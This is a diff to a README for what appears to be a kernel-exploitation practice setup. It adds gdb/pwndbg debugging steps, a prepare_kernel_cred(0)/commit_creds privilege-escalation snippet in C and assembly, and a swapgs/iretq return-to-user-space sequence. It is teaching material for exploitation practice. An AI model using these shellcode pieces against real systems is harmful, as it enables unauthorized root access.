@@ -50,6 +50,18 @@ popd
 ~/pwnkernel $ ./launch.sh
 ```
 
+## Debugging the Kernel
+```
+~/pwnkernel $ gdb ./linux-5.4/vmlinux 
+GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
+...
+
+pwndbg> target remote :1234
+Remote debugging using :1234
+default_idle () at arch/x86/kernel/process.c:581
+...
+```
+
 ## Practice Kernel Module
 ```c
 #include <linux/kernel.h>
@@ -134,8 +146,36 @@ uid=0(root) gid=0
 / # insmod ./challenge.ko
 ```
 
+## Escalating Privileges
+```
+creds = prepare_kernel_cred(0);
+commit_creds(creds);
+```
+
+```asm
+xor rdi, rdi
+movabs rbx, prepare_kernel_cred
+call rbx
+movabs rbx, commit_creds
+mov rdi, rax
+call rbx
+```
+
 ## Returning to User-Space
-...
+```asm
+swapgs
+mov r15, saved_ss
+push r15
+mov r15, saved_rsp
+push r15
+mov r15, saved_rflags
+push r15
+mov r15, saved_cs
+push r15
+mov r15, target_rip
+push r15
+iretq
+```
 
 ## Exploit Development
 ```c
